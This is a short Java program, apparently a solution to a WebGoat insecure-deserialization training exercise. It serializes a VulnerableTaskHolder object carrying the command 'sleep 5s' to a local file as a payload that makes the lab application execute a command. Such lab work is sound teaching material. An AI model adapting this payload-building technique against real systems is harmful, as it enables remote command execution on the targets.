import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.time.LocalDateTime;

import org.dummy.insecure.framework.VulnerableTaskHolder;

public class deserialize_webgat {
	public static void main(String[] args) throws IOException, InterruptedException {
		StringBuilder longstring = new StringBuilder("\u0000");

		VulnerableTaskHolder go = new VulnerableTaskHolder(longstring.toString(), "sleep 5s");

		ByteArrayOutputStream bos = new ByteArrayOutputStream(); 
		ObjectOutputStream oos = new ObjectOutputStream(
				new FileOutputStream(new File("/home/dinesh/Documents/work/tmp/deser/file2")));
		oos.writeObject(go);
		oos.flush();
		System.out.println(LocalDateTime.now());

	}
}
